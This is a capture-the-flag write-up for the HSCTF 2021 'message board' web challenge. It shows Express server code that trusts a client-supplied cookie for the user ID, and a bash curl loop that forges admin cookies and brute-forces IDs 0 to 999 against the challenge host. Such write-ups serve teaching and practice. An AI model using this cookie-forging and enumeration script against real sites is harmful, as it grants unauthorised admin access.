---
title: HSCTF 2021 - message board | Web
published: true
---

## [](#header-2)Warmup

> Your employer, LameCompany, has lots of gossip on its company message board: message-board.hsc.tf. You, Kupatergent, are able to access some of the tea, but not all of it! Unsatisfied, you figure that the admin user must have access to ALL of the tea. Your goal is to find the tea you've been missing out on.

Your login credentials: username: kupatergent password: gandal

Given server code:

```
const express = require("express")
const cookieParser = require("cookie-parser")
const ejs = require("ejs")
require("dotenv").config()

const app = express()
app.use(express.urlencoded({ extended: true }))
app.use(cookieParser())
app.set("view engine", "ejs")
app.use(express.static("public"))

const users = [
    {
        userID: "972",
        username: "kupatergent",
        password: "gandal"
    },
    {
        userID: "***",
        username: "admin"
    }
]

app.get("/", (req, res) => {
    const admin = users.find(u => u.username === "admin")
    if(req.cookies && req.cookies.userData && req.cookies.userData.userID) {
        const {userID, username} = req.cookies.userData
        if(req.cookies.userData.userID === admin.userID) res.render("home.ejs", {username: username, flag: process.env.FLAG})
        else res.render("home.ejs", {username: username, flag: "no flag for you"})
    } else {
        res.render("unauth.ejs")
    }
})

app.route("/login")
.get((req, res) => {
    if(req.cookies.userData && req.cookies.userData.userID) {
        res.redirect("/")
    } else {
        res.render("login.ejs", {err: false})
    }
})
.post((req, res)=> {
    const request = {
        username: req.body.username,
        password: req.body.password
    }
    const user = users.find(u => (u.username === request.username && u.password === request.password))
    if(user) {
        res.cookie("userData", {userID: user.userID, username: user.username})
        res.redirect("/")
    } else {
        res.render("login", {err: true}) // didn't work!
    }
})

app.get("/logout", (req, res) => {
    res.clearCookie("userData")
    res.redirect("/login")
}) 

app.listen(3000, (err) => {
    if (err) console.log(err);
    else console.log("connected at 3000 :)");
})
```
### [](#header-3)Solution

After inputting the given credentials, I am greeted with this screen.

![image](https://user-images.githubusercontent.com/81070073/122327166-4de95480-cee2-11eb-8908-67f76c491150.png)

After checking out the server code, I noticed that the flag will be granted if the userID and the username "Admin" match. The userID has a three digit number only. 

Also, the userID and the username are actually encoded in the cookie value.

Using kupatergent as an example, this person's userID and username are stored in the cookie value "j%3A%7B%22userID%22%3A%22972%22%2C%22username%22%3A%22kupatergent%22%7D", which is encoded.

![image](https://user-images.githubusercontent.com/81070073/122327471-c2bc8e80-cee2-11eb-9bb6-32ee8550fbab.png)

I have written a bash script that will help me bruteforce and provide the cookie encoded in the similar manner, in which the userID will be attempted in the range from 0 to 999.

```
#!/bin/bash

for i in {0..999}
do
        curl --cookie "userData=j%3A%7B%22userID%22%3A%22$i%22%2C%22username%22%3A%22admin%22%7D" "https://message-board.hsc.tf/"
done

```

After executing the script:

```
$ ./script.sh | grep "flag{" > output.txt
$ cat output.txt

```
